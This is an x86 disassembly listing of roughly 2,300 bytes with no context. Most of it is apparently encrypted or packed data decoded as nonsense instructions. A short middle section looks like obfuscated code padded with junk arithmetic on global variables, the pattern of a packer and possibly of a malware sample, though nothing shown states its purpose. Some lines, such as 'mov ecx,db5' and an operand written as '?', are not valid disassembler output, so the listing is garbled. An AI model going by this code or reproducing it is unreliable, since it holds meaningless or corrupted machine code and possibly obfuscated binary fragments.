  403e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e86:	jg     0x403e6e
  403e88:	mov    edi,0x6d919930
  403e8d:	repz sar DWORD PTR [edx],1
  403e90:	mov    dh,0x2e
  403e92:	dec    edx
  403e93:	mov    esp,0xac9c3d0f
  403e98:	mov    ebp,0x7bd0dddc
  403e9d:	push   ebx
  403e9e:	js     0x403e76
  403ea0:	jb     0x403e88
  403ea2:	add    dh,BYTE PTR [ebx+0x387ec350]
  403ea8:	pop    edi
  403ea9:	add    ecx,DWORD PTR [bx+di+0x1b98]
  403eae:	lods   eax,DWORD PTR ds:[esi]
  403eaf:	fcom   DWORD PTR [edx+0x35a42ea9]
  403eb5:	xchg   esi,eax
  403eb6:	in     al,dx
  403eb7:	rcl    cl,1
  403eb9:	xchg   BYTE PTR [ecx],ah
  403ebb:	xor    al,0xef
  403ebd:	neg    BYTE PTR [eax+0x46]
  403ec0:	and    bl,ah
  403ec2:	or     al,0x86
  403ec4:	jg     0x403ebe
  403ec6:	mov    ecx,0x43f4ed1e
  403ecb:	lahf   
  403ecc:	dec    DWORD PTR [esi+edi*8-0xb9c1c75]
  403ed3:	fstp   TBYTE PTR [ecx+0x4fc347c4]
  403ed9:	sub    eax,0xc6e0f4
  403ede:	gs fsubp st(3),st
  403ee1:	fcom   QWORD PTR [edi-0x56]
  403ee4:	sahf   
  403ee5:	mov    ah,0x3b
  403ee7:	addr16 test al,0xce
  403eea:	cmp    BYTE PTR [ecx+0x41179c32],ah
  403ef0:	inc    ebp
  403ef1:	loope  0x403e99
  403ef3:	jecxz  0x403ecf
  403ef5:	jle    0x403e7f
  403ef7:	into   
  403ef8:	jo     0x403eea
  403efa:	(bad)  
  403efd:	(bad)  
  403efe:	jne    0x403f2f
  403f00:	mov    ds:0x1b262eb7,al
  403f05:	xlat   BYTE PTR ds:[ebx]
  403f06:	aaa    
  403f07:	imul   DWORD PTR [esi]
  403f09:	int    0x9c
  403f0b:	(bad)  
  403f0c:	sbb    BYTE PTR [esi],al
  403f0e:	scas   eax,DWORD PTR es:[edi]
  403f0f:	xchg   ebx,eax
  403f10:	into   
  403f11:	ret    
  403f12:	fisub  WORD PTR [ebp+0x34]
  403f15:	inc    eax
  403f16:	mov    edi,0xedd4add8
  403f1b:	into   
  403f1c:	mov    ebp,0x9baff651
  403f21:	xchg   edi,eax
  403f22:	int    0x91
  403f24:	mov    BYTE PTR [edi+0x77],ah
  403f27:	add    ecx,DWORD PTR [edi+0x43]
  403f2a:	jle    0x403f35
  403f2c:	mov    ch,0xed
  403f2e:	aas    
  403f2f:	jmp    0x403f2f
  403f31:	xor    al,0x2f
  403f33:	or     BYTE PTR [ebx],ah
  403f35:	mov    edi,0x2fad0698
  403f3a:	jo     0x403ef6
  403f3c:	mov    ebx,0xc39d7fa2
  403f41:	mov    esp,0x2872e2ae
  403f46:	stos   BYTE PTR es:[edi],al
  403f47:	cmp    esi,DWORD PTR [eax+0x73]
  403f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f4b:	mov    bh,0x21
  403f4d:	sar    esp,0xe0
  403f50:	add    BYTE PTR [ecx-0x6730a792],ch
  403f56:	mov    cl,0xf0
  403f58:	pop    edi
  403f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f5a:	scas   eax,DWORD PTR es:[edi]
  403f5b:	or     al,0xf0
  403f5d:	and    ebx,DWORD PTR [eax]
  403f5f:	ins    BYTE PTR es:[edi],dx
  403f60:	push   esp
  403f61:	inc    ebx
  403f62:	retf   
  403f63:	adc    DWORD PTR [esi-0x111d05f3],edx
  403f69:	sbb    BYTE PTR [edx+0x5a],0xe0
  403f6d:	jg     0x403efc
  403f6f:	imul   edi,DWORD PTR [esi+0x1ef0ae06],0x3c
  403f76:	mov    eax,0x1efedf16
  403f7b:	xchg   edi,eax
  403f7c:	lods   eax,DWORD PTR ds:[esi]
  403f7d:	aaa    
  403f7e:	xchg   ebp,eax
  403f7f:	pop    esp
  403f80:	sar    al,0xe4
  403f83:	lds    ebx,FWORD PTR [ebp-0x65]
  403f86:	sbb    DWORD PTR ds:[edi+0x74],eax
  403f8a:	xor    dl,BYTE PTR [ecx+0x3f]
  403f8d:	cmp    DWORD PTR [ecx+0x5f896be9],0xe630a792
  403f97:	mov    bl,0xa2
  403f99:	mov    ecx,0x443865b6
  403f9e:	xchg   edi,eax
  403f9f:	ficom  WORD PTR [ebp-0x30a399d6]
  403fa5:	mov    ecx,db5
  403fa8:	push   esi
  403fa9:	or     BYTE PTR [ebx+ecx*1],bl
  403fac:	imul   eax,DWORD PTR [eax+0x47],0xffd9ee4f
  403fb3:	ret    0x1373
  403fb6:	push   es
  403fb7:	fsub   QWORD PTR [edx+0x7b2f57eb]
  403fbd:	lods   eax,DWORD PTR ds:[esi]
  403fbe:	test   DWORD PTR [ecx-0x417aee14],0x81722cd6
  403fc8:	mov    ds:0x19ecb531,al
  403fcd:	rcr    al,1
  403fcf:	(bad)  
  403fd0:	stc    
  403fd1:	xlat   BYTE PTR ds:[ebx]
  403fd2:	cmp    eax,0x666dd424
  403fd7:	in     eax,0xb5
  403fd9:	cmp    eax,0xa47b8c2c
  403fde:	dec    edi
  403fdf:	dec    ecx
  403fe0:	mov    esi,0xd8171f08
  403fe5:	(bad)  
  403fe6:	ficom  DWORD PTR ds:[edi-0x261c45a1]
  403fed:	cmp    ch,BYTE PTR [edi+0x79]
  403ff0:	scas   eax,DWORD PTR es:[edi]
  403ff1:	xchg   ebp,eax
  403ff2:	iret   
  403ff3:	outs   dx,DWORD PTR ds:[esi]
  403ff4:	inc    esp
  403ff5:	retf   
  403ff6:	and    al,0xc1
  403ff8:	dec    ebp
  403ff9:	addr16 gs push esi
  403ffc:	cmp    BYTE PTR [esi-0x43],bl
  403fff:	retf   
  404000:	push   0xfc3f01a
  404005:	sub    BYTE PTR [edi+0x40e539],cl
  40400b:	jle    0x403f97
  40400d:	dec    edi
  40400e:	punpcklbw mm4,DWORD PTR [esi+0x78ca66f3]
  404015:	dec    edx
  404016:	mov    ch,BYTE PTR [edi-0x534cb51d]
  40401c:	pop    ecx
  40401d:	ror    DWORD PTR [esi+0x67a0d458],cl
  404023:	dec    esp
  404024:	mov    al,ds:0xeaac21b
  404029:	mov    eax,0xfed03e19
  40402e:	rcr    DWORD PTR [ebx+0x74dcc3a8],cl
  404034:	in     eax,dx
  404035:	add    eax,DWORD PTR [ecx+0x4]
  404038:	jbe    0x404027
  40403a:	add    DWORD PTR [ebp+0x4e52ea4],0x821d51cd
  404044:	jmp    0x403fc6
  404046:	into   
  404047:	es fninit 
  40404a:	sti    
  40404b:	and    BYTE PTR [eax-0xd],dh
  40404e:	inc    ebx
  40404f:	dec    ecx
  404050:	adc    BYTE PTR [ecx],bl
  404052:	mov    ebp,DWORD PTR [eax]
  404054:	jmp    0x6e18:0xc8ac8445
  40405b:	and    dh,BYTE PTR ds:0x1abeb1c7
  404061:	popa   
  404062:	call   0x67752b46
  404067:	sub    DWORD PTR [ecx-0x16],edx
  40406a:	call   0x10fc6f8d
  40406f:	bound  esi,QWORD PTR [edx]
  404071:	mov    DWORD PTR [esp+edi*2+0x77],esp
  404075:	sti    
  404076:	xchg   edi,eax
  404077:	xchg   ecx,eax
  404078:	xor    DWORD PTR [edx+eax*4+0x76dd52a1],ebx
  40407f:	inc    ecx
  404080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404081:	out    0x7b,eax
  404083:	test   eax,0x387e78e3
  404088:	mov    bl,0x1c
  40408a:	xchg   esp,eax
  40408b:	mov    al,0xd
  40408d:	add    eax,0x407c32e8
  404092:	sbb    eax,0xc8a841db
  404097:	rcr    BYTE PTR [ecx-0x18dcf1d6],1
  40409d:	test   al,0x74
  40409f:	scas   al,BYTE PTR es:[edi]
  4040a0:	mov    cs,WORD PTR [ecx+0x5f4b946]
  4040a6:	(bad)  
  4040a8:	arpl   WORD PTR ds:0xf142bb1e,di
  4040ae:	outs   dx,DWORD PTR ds:[esi]
  4040af:	add    eax,0xc94f355f
  4040b4:	test   DWORD PTR [ebp+eiz*1+0x38d7d93e],esi
  4040bb:	pop    ds
  4040bc:	test   bh,dh
  4040be:	mov    edx,0x930151d2
  4040c3:	les    eax,FWORD PTR [ebp+0x73]
  4040c6:	mov    fs,WORD PTR [ecx+0x2d]
  4040c9:	lock leavew 
  4040cc:	mov    BYTE PTR [esi+0x107a8bda],ah
  4040d2:	pop    edx
  4040d3:	jge    0x404101
  4040d5:	nop
  4040d6:	pop    es
  4040d7:	ror    BYTE PTR [edx+0xd],cl
  4040da:	mov    ecx,0xb471d3e7
  4040df:	ja     0x4040f1
  4040e1:	mov    esi,0x7e33592
  4040e6:	mov    ds:0x91661a10,eax
  4040eb:	stc    
  4040ec:	and    cl,BYTE PTR [esi]
  4040ee:	icebp  
  4040ef:	stos   DWORD PTR es:[edi],eax
  4040f0:	lods   al,BYTE PTR ds:[esi]
  4040f1:	mov    esp,0xc4021af8
  4040f6:	sbb    al,0xa1
  4040f8:	xor    DWORD PTR [ecx],eax
  4040fa:	ins    DWORD PTR es:[edi],dx
  4040fb:	xor    edi,edi
  4040fd:	xchg   edx,eax
  4040fe:	dec    edi
  4040ff:	adc    esi,DWORD PTR [edi]
  404101:	mov    ah,0x3a
  404103:	test   eax,0x6db61ec0
  404108:	fcomp  QWORD PTR [edx+0x0]
  40410b:	shl    BYTE PTR [edi-0xaef0068],1
  404111:	popa   
  404112:	es popf 
  404114:	pop    es
  404115:	pop    esi
  404116:	cmc    
  404117:	dec    esi
  404118:	sub    dl,BYTE PTR [esi+edi*8]
  40411b:	or     DWORD PTR [edi+0x4b],edi
  40411e:	mov    ds:0xfbbf5f70,al
  404123:	inc    edx
  404124:	mov    dh,0x54
  404126:	add    eax,0xa6840231
  40412b:	or     DWORD PTR [si],ebp
  40412e:	ret    0x3e1e
  404131:	sub    al,0x62
  404133:	jns    0x404163
  404135:	lea    ebx,[ecx+0x36]
  404138:	or     BYTE PTR [ebx-0x71],ah
  40413b:	xchg   ecx,eax
  40413c:	iret   
  40413d:	test   eax,0xf426cac9
  404142:	jae    0x40415d
  404144:	stc    
  404145:	(bad)  
  404146:	daa    
  404147:	sub    edx,DWORD PTR [ebx-0x4ccccabd]
  40414d:	test   DWORD PTR [esi+0x4],ebp
  404150:	pop    ecx
  404151:	std    
  404152:	jae    0x40414b
  404154:	mov    ebx,0x48845d3e
  404159:	cmp    BYTE PTR [ebx],0xce
  40415c:	cmp    DWORD PTR [ebp+edx*1-0x543407a6],ecx
  404163:	adc    dl,bh
  404165:	mov    ecx,0x4e5f7604
  40416a:	add    al,0xf0
  40416c:	inc    eax
  40416d:	call   0x7b4b:0xafae37e1
  404174:	pop    esp
  404175:	push   esi
  404176:	or     DWORD PTR [ecx+0x6b],edi
  404179:	cmp    eax,0x51e5d1d1
  40417e:	xchg   ebp,eax
  40417f:	rol    DWORD PTR [edi+0x73],1
  404182:	pop    ebp
  404183:	repnz xor cl,dh
  404186:	aaa    
  404187:	sub    eax,0x95d20de3
  40418c:	imul   eax,DWORD PTR [edi+edx*1],0x9ea27b98
  404193:	and    BYTE PTR ds:0xa17378db,ah
  404199:	icebp  
  40419a:	sbb    al,0x2a
  40419c:	les    edi,FWORD PTR [esi]
  40419e:	jo     0x40417c
  4041a0:	in     eax,0xd2
  4041a2:	push   0xa904166
  4041a7:	mov    al,ds:0xd62d3b0b
  4041ac:	mov    ds:0xe4e52093,eax
  4041b1:	dec    ebx
  4041b2:	jae    0x4041b5
  4041b4:	adc    BYTE PTR [ebx+0x4284753d],al
  4041ba:	add    BYTE PTR [eax],al
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x428331,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x4284cd
  4041d3:	cmp    DWORD PTR ds:0x428475,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x428425
  4041f9:	xor    edx,DWORD PTR ds:0x428561
  4041ff:	mov    DWORD PTR ds:0x428425,edx
  404205:	or     edx,DWORD PTR ds:0x428501
  40420b:	movzx  edx,WORD PTR ds:0x42843d
  404212:	and    DWORD PTR ds:0x428461,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x428411,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x4283dd
  404230:	mov    edx,DWORD PTR ds:0x428521
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428471,0x0
  404245:	mov    DWORD PTR ds:0x428365,0x80f
  40424f:	mov    DWORD PTR ds:0x428569,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x42841d,0x4518
  404264:	cmp    DWORD PTR ds:0x428471,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x4284b1
  404288:	mov    edx,DWORD PTR ds:0x4285a1
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x42843d,0x3b89
  40429d:	sbb    DWORD PTR ds:0x428581,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x4284e9
  4042ac:	xor    ecx,DWORD PTR ds:0x428559
  4042b2:	mov    DWORD PTR ds:0x4284e9,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428579,0x0
  4042c9:	mov    DWORD PTR ds:0x4284e9,ecx
  4042cf:	mov    DWORD PTR ds:0x428479,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x428435,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428579,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x428429
  404303:	and    ecx,DWORD PTR ds:0x428565
  404309:	mov    DWORD PTR ds:0x428429,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428361
  404315:	sbb    DWORD PTR ds:0x428439,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [esp-0x4261dda9],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0x8b5c107f
  404380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404381:	adc    ah,BYTE PTR [ebx+0x449878a4]
  404387:	(bad)  
  404388:	cmp    DWORD PTR [ebx+0x58],ebp
  40438b:	lahf   
  40438c:	sbb    al,0xb6
  40438e:	xor    eax,0x454f0dc4
  404393:	ja     0x40439a
  404395:	stos   DWORD PTR es:[edi],eax
  404396:	stos   DWORD PTR es:[edi],eax
  404397:	xor    BYTE PTR [eax],bl
  404399:	jb     0x4043aa
  40439b:	scas   al,BYTE PTR es:[edi]
  40439c:	inc    BYTE PTR [edx-0x240978f8]
  4043a2:	call   0x1739e582
  4043a7:	out    0x16,eax
  4043a9:	cmp    dl,BYTE PTR [edi]
  4043ab:	push   edi
  4043ac:	jmp    0x4043b2
  4043ae:	loope  0x4043ef
  4043b0:	inc    esp
  4043b1:	cmp    BYTE PTR [ecx],bl
  4043b3:	inc    ebx
  4043b4:	mov    esp,0x355b6d5
  4043b9:	bound  eax,QWORD PTR [edi-0x39]
  4043bc:	or     BYTE PTR [edi-0x7d],dh
  4043bf:	cmp    cl,BYTE PTR [eax-0x516cdcce]
  4043c5:	repnz stos DWORD PTR es:[edi],eax
  4043c7:	aam    0xfc
  4043c9:	dec    esp
  4043ca:	push   DWORD PTR [ebx+ebp*1]
  4043cd:	pushf  
  4043ce:	lds    edi,FWORD PTR [eax-0x60874b8e]
  4043d4:	dec    ecx
  4043d5:	call   0xf1bdc8d9
  4043da:	pop    esp
  4043db:	jmp    0x181:0x18213f0f
  4043e2:	adc    edi,esi
  4043e4:	mov    bl,0xdc
  4043e6:	inc    esi
  4043e7:	cmp    ah,BYTE PTR [edi+0x40]
  4043ea:	outs   dx,BYTE PTR ds:[esi]
  4043eb:	rol    ah,1
  4043ed:	and    cl,BYTE PTR [ebp-0x26]
  4043f0:	in     eax,0x4c
  4043f2:	retf   
  4043f3:	cmp    dl,dl
  4043f5:	imul   eax,DWORD PTR [ecx],0xbe10ce35
  4043fb:	ret    
  4043fc:	rol    BYTE PTR [eax],cl
  4043fe:	dec    esi
  4043ff:	sbb    ah,BYTE PTR [edi]
  404401:	push   edi
  404402:	inc    esi
  404403:	mov    ds:0x91566f6c,eax
  404408:	cdq    
  404409:	test   eax,0x15a3173e
  40440e:	lock xchg esp,eax
  404410:	jno    0x4043a5
  404412:	jp     0x404409
  404414:	push   eax
  404415:	sbb    bl,BYTE PTR [edx]
  404417:	gs pop ds
  404419:	inc    ebp
  40441a:	add    DWORD PTR [ecx-0x5f],esp
  40441d:	mov    BYTE PTR [esi],ch
  40441f:	test   eax,0x1c1b8dc
  404424:	mov    al,0xbd
  404426:	cmc    
  404427:	sub    al,0x50
  404429:	jns    0x40449a
  40442b:	mov    ecx,0xed5b952f
  404430:	repnz push cs
  404432:	or     al,0x10
  404434:	mov    BYTE PTR [ebp+0x61538814],0x2
  40443b:	mov    ebp,0x91896757
  404440:	(bad)  [edi+edx*4]
  404443:	in     al,0xbe
  404445:	ds enter 0x9951,0xe5
  40444a:	dec    esi
  40444b:	loop   0x4043ed
  40444d:	push   ecx
  40444e:	inc    eax
  40444f:	add    edi,DWORD PTR [edi]
  404451:	mov    ah,0x6d
  404453:	sbb    eax,0x4182c544
  404458:	push   0x26e3a173
  40445d:	or     eax,DWORD PTR [edx+0x703e9fe2]
  404463:	(bad)  
  404464:	mov    ebx,0x9d109928
  404469:	ja     0x404413
  40446b:	in     eax,0xa5
  40446d:	popa   
  40446e:	xor    DWORD PTR [edi-0x6],esp
  404471:	(bad)  
  404472:	fsub   QWORD PTR [edi-0x4f]
  404475:	adc    esp,DWORD PTR [ebx-0x6b]
  404478:	(bad)  
  40447a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40447b:	or     BYTE PTR [ebp+edx*2+0x6150a358],ah
  404482:	lods   al,BYTE PTR ds:[esi]
  404483:	retf   
  404484:	dec    eax
  404485:	sti    
  404486:	in     al,dx
  404487:	xor    DWORD PTR [ebp-0x4d],ebp
  40448a:	mov    ds:0xdbe6505c,al
  40448f:	adc    ch,BYTE PTR [edi+0xfcfe6d2]
  404495:	pop    ebp
  404496:	xchg   ebp,eax
  404497:	test   DWORD PTR [ecx-0x76],esi
  40449a:	pop    ebp
  40449b:	retf   
  40449c:	push   ecx
  40449d:	je     0x40447d
  40449f:	ins    BYTE PTR es:[edi],dx
  4044a0:	test   DWORD PTR [edi+0x49],ebx
  4044a3:	rcr    DWORD PTR [edx+eax*2-0x7458e9ee],cl
  4044aa:	js     0x404522
  4044ac:	or     eax,0x73e5356c
  4044b1:	scas   al,BYTE PTR es:[edi]
  4044b2:	pop    esp
  4044b3:	dec    edx
  4044b4:	inc    esp
  4044b5:	mov    ecx,0xe39fd3ff
  4044ba:	pop    eax
  4044bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044bc:	ficomp DWORD PTR [ebx]
  4044be:	out    0x59,eax
  4044c0:	imul   eax,DWORD PTR [ebx+0x13],0x40
  4044c4:	xchg   BYTE PTR [ebx-0x3e27f7f5],bh
  4044ca:	ret    
  4044cb:	adc    eax,0x9c1aa1e9
  4044d0:	fld    st(5)
  4044d2:	daa    
  4044d3:	sbb    eax,0xb828b91a
  4044d8:	lods   al,BYTE PTR ds:[esi]
  4044d9:	pop    ebp
  4044da:	dec    eax
  4044db:	dec    ecx
  4044dc:	cmc    
  4044dd:	adc    BYTE PTR [ecx],bh
  4044df:	xchg   dh,cl
  4044e1:	mov    esi,0x2eacd1fc
  4044e6:	aad    0x60
  4044e8:	mov    esp,0xd0f9787e
  4044ed:	dec    eax
  4044ee:	test   esp,0x9e39098b
  4044f4:	jo     0x40449e
  4044f6:	push   esi
  4044f7:	or     BYTE PTR [edi+esi*2],0xcd
  4044fb:	cs aad 0xfc
  4044fe:	xchg   BYTE PTR [ecx-0x1f36b1b7],ah
  404504:	iret   
  404505:	test   eax,0xa65d437c
  40450a:	int    0xcb
  40450c:	bound  eax,QWORD PTR [ecx-0x7443593d]
  404512:	loop   0x404502
  404514:	loopne 0x404525
  404516:	(bad)  
  404517:	nop
  404518:	test   al,0x3f
  40451a:	jle    0x40450d
  40451c:	ds test al,0x4e
  40451f:	mul    BYTE PTR ss:[eax-0x57]
  404523:	and    dl,BYTE PTR [edi+0x6d]
  404526:	mov    WORD PTR [edx+0x2a],ss
  404529:	pop    ecx
  40452a:	mov    ebx,0xfedac399
  40452f:	xor    DWORD PTR [ecx],eax
  404531:	out    0xfb,al
  404533:	aad    0x8d
  404535:	push   ebp
  404536:	cmp    ch,ah
  404538:	das    
  404539:	loopne 0x40453c
  40453b:	inc    ebx
  40453c:	bound  edx,QWORD PTR [edi+0x44115f1f]
  404542:	out    0x91,eax
  404544:	ss ins BYTE PTR es:[edi],dx
  404546:	je     0x404583
  404548:	mov    al,ds:0x94e16893
  40454d:	or     eax,0x6c3d566c
  404552:	pop    ebp
  404553:	mov    ds:0xeef90c59,al
  404558:	dec    edi
  404559:	test   BYTE PTR ds:0x1e42d6c,0x25
  404560:	pop    ebp
  404561:	or     al,0xa3
  404563:	push   ebx
  404564:	lea    ebx,ds:0xe2671b4f
  40456a:	(bad)  
  40456b:	les    edx,FWORD PTR [ecx+0x1c559a22]
  404571:	(bad)  [edx]
  404573:	adc    BYTE PTR [edx+0x37],bh
  404576:	sti    
  404577:	aam    0x49
  404579:	popa   
  40457a:	fldcw  WORD PTR [edi+0x4b40fd53]
  404580:	pop    ecx
  404581:	test   al,0x26
  404583:	ds push esp
  404585:	int    0xca
  404587:	pop    ss
  404588:	(bad)  
  40458a:	sbb    eax,0x64dddb57
  40458f:	fild   WORD PTR [edi+0x3a]
  404592:	retf   
  404593:	out    dx,eax
  404594:	sub    al,0xee
  404596:	and    esi,ebp
  404598:	adc    esp,DWORD PTR [edi+ecx*2]
  40459b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40459c:	(bad)  
  40459d:	cdq    
  40459e:	int    0xdd
  4045a0:	push   ds
  4045a1:	out    0x85,al
  4045a3:	push   eax
  4045a4:	mov    ah,0xc8
  4045a6:	push   edi
  4045a7:	push   ds
  4045a8:	js     0x404539
  4045aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ab:	mov    al,ds:0xb097599a
  4045b0:	push   es
  4045b1:	jbe    0x404586
  4045b3:	adc    eax,esp
  4045b5:	xor    DWORD PTR [esi-0x25],esi
  4045b8:	int3   
  4045b9:	sahf   
  4045ba:	mov    ch,bl
  4045bc:	shl    BYTE PTR [ecx+0x5b],cl
  4045bf:	mov    ebp,0xce9d1a7f
  4045c4:	es popa 
  4045c6:	or     DWORD PTR [ecx],esp
  4045c8:	loope  0x4045ee
  4045ca:	aas    
  4045cb:	ins    DWORD PTR es:[edi],dx
  4045cc:	arpl   WORD PTR [ebp-0x1f],sp
  4045cf:	pop    ss
  4045d0:	mov    ah,0x7c
  4045d2:	adc    bh,dh
  4045d4:	inc    ecx
  4045d5:	add    eax,0x3f7778f5
  4045da:	mov    dl,0x56
  4045dc:	int    0x47
  4045de:	sub    BYTE PTR [edx+0x3c],cl
  4045e1:	loop   0x40458a
  4045e3:	xor    BYTE PTR [edi],0xa4
  4045e6:	outs   dx,BYTE PTR ds:[esi]
  4045e7:	push   edx
  4045e8:	aad    0x9
  4045ea:	mov    ss,WORD PTR [esi+ebx*4]
  4045ed:	xlat   BYTE PTR ds:[ebx]
  4045ee:	jg     0x40457b
  4045f0:	pop    edi
  4045f1:	fs stos DWORD PTR es:[edi],eax
  4045f3:	mov    cl,0x6c
  4045f5:	add    BYTE PTR es:[eax+0x7567f741],al
  4045fc:	mov    cl,0x72
  4045fe:	ret    0x56c9
  404601:	enter  0xe345,0xc4
  404605:	add    eax,0x8e463aa8
  40460a:	jbe    0x4045c9
  40460c:	shl    dl,1
  40460e:	gs mov cl,0x1f
  404611:	sbb    edx,DWORD PTR [edx+ecx*8+0x79ba8a94]
  404618:	add    eax,0xf50d7579
  40461d:	inc    ebp
  40461e:	mov    ah,0x49
  404620:	test   DWORD PTR [ecx+0x5c],eax
  404623:	cmc    
  404624:	mov    edx,0xc969d0d9
  404629:	(bad)  
  40462a:	fdivp  st(7),st
  40462c:	mov    ebp,0xd090d7c6
  404631:	les    ecx,FWORD PTR [edx-0x3d118f1a]
  404637:	mov    eax,0x5ca6522d
  40463c:	(bad)  
  40463d:	es mov dh,0x2b
  404640:	dec    esp
  404641:	shr    DWORD PTR [edi+0x346b2288],cl
  404647:	push   ebx
  404648:	stos   DWORD PTR es:[edi],eax
  404649:	xchg   ebp,eax
  40464a:	jmp    0x1068:0x710ca33b
  404651:	pusha  
  404652:	mov    dh,0xe2
  404654:	inc    esi
  404655:	outs   dx,DWORD PTR ds:[esi]
  404656:	jmp    0xf220e9ad
  40465b:	(bad)  
  40465c:	jg     0x4046d2
  40465e:	mov    al,ds:0x5a40e597
  404663:	jo     0x404681
  404665:	dec    esp
  404666:	mov    edx,edi
  404668:	sub    eax,DWORD PTR [esi+0x71c397b3]
  40466e:	mov    edi,DWORD PTR [ebx+0x4e00fb3c]
  404674:	jecxz  0x4046b9
  404676:	iret   
  404677:	sbb    ch,BYTE PTR [edx+ebx*2-0x5535a452]
  40467e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40467f:	xor    ah,BYTE PTR [ecx]
  404681:	das    
  404682:	mov    cl,0x1b
  404684:	and    al,0xf4
  404686:	adc    al,0x9e
  404688:	aam    0x57
  40468a:	xor    cl,BYTE PTR [esi+0x77389414]
  404690:	ret    0x5934
  404693:	mov    edi,0x6b8f4a9f
  404698:	xor    DWORD PTR [esi+0x67],ebx
  40469b:	jmp    0xe92799fb
  4046a0:	push   esi
  4046a1:	inc    ebx
  4046a2:	or     ah,BYTE PTR [ecx+0x12]
  4046a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a6:	nop
  4046a7:	sub    DWORD PTR [edi],eax
  4046a9:	rcr    dh,0xea
  4046ac:	jno    0x40466a
  4046ae:	inc    edx
  4046af:	xor    BYTE PTR [esi],0x48
  4046b2:	outs   dx,DWORD PTR ds:[esi]
  4046b3:	xchg   ecx,eax
  4046b4:	fs xchg edi,eax
  4046b6:	test   BYTE PTR [ecx-0x1963ff00],al
  4046bc:	arpl   WORD PTR [edx-0x2f],sp
  4046bf:	mov    cl,0x38
  4046c1:	lea    edx,[ebp+0x3dc69c0]
  4046c7:	push   esp
  4046c8:	fs addr16 (bad) 
  4046cb:	out    0xbb,eax
  4046cd:	retf   0x8a93
  4046d0:	pop    eax
  4046d1:	mov    WORD PTR [ebp-0x7e],?
  4046d4:	mov    ebx,0xe4a28c61
  4046d9:	or     bl,BYTE PTR [ecx+0x6f]
  4046dc:	enter  0x4be0,0xac
  4046e0:	jge    0x4046a3
  4046e2:	outs   dx,DWORD PTR ds:[esi]
  4046e3:	std    
  4046e4:	push   esi
  4046e5:	and    eax,0x397c9d36
  4046ea:	pop    edx
  4046eb:	rcr    BYTE PTR [ecx+0x46],0xc3
  4046ef:	inc    esp
  4046f0:	xlat   BYTE PTR ds:[ebx]
  4046f1:	mov    bh,0xb1
  4046f3:	and    BYTE PTR [eax+0x3690557e],ch
  4046f9:	dec    eax
  4046fa:	push   ebx
  4046fb:	or     DWORD PTR [esi-0x74b0ff4a],ebp
  404701:	inc    ebp
  404702:	ror    BYTE PTR [ebx-0x53f02bb3],1
  404708:	enter  0xc102,0xe9
  40470c:	add    cl,BYTE PTR [ebx+0x558bd04d]
  404712:	aam    0x33
  404714:	mov    ecx,0xd2331ee1
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
